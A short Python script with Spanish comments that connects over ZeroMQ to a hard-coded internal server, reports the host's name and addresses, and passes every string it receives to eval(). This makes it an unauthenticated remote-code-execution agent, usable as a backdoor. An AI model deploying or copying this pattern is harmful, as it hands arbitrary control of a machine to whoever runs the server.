#!/usr/bin/pyhton/env

import zmq
import os
import sys
import socket
import os

s = socket
context = zmq.Context()
socket = context.socket(zmq.REQ)
servSock = 'tcp://{0}:{1}'.format('10.121.3.60', '5556')
socket.connect(servSock)

nombrePC = s.gethostbyname_ex(s.gethostname())
comando = []
envioInicial = nombrePC
devuelve = []

while True:
    
    devuelve.extend(envioInicial)
    devuelve.extend(comando)
    #Se transforma en string
    #darFormatoDevuelve = ','.join(str(x) for x in devuelve)
    darFormatoDevuelve = str(devuelve)

    print('Enviando al servidor:{0}'.format(darFormatoDevuelve))
    socket.send(darFormatoDevuelve)
    
    recibido = socket.recv()
    print('Recibiendo desde el servidor:{0}'.format(recibido))
    
    if recibido:
        try:
            #print('Ejecutando el EVAL')
            comando = eval(recibido)
            print('comando contiene:'.format(str(comando)))
            devuelve = []
            darFormatoDevuelve = ''
        except Exception as e:
            print('Hubo una excepcion:',e)
            comando = ''
            comando = e
            devuelve = []
            darFormatoDevuelve = ''
    else:
        comando = ''
        devuelve = []
        darFormatoDevuelve = ''

